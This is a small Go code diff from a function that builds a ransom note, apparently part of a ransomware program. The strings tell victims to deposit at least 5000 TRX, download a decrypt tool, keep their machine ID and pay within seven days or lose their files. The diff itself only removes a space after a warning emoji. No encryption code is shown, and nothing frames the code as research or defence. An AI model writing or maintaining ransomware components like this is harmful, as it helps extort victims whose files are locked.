@@ -44,7 +44,7 @@ func buildReadmeContent(successCount, failCount int, machineID string) string {
 		"   4. Deposit minimum 5000 TRX to your wallet\n",
 		"   5. Download the decrypt tool\n",
 		"   6. Run the decrypt tool to restore your files\n\n",
-		"⚠️  WARNING:\n",
+		"⚠️ WARNING:\n",
 		"   • Keep this machine id safe! You will need it to decrypt your files\n",
 		"   • You have 7 days to complete the payment\n",
 		"   • After 7 days, you will lose access to the decrypt tool\n",
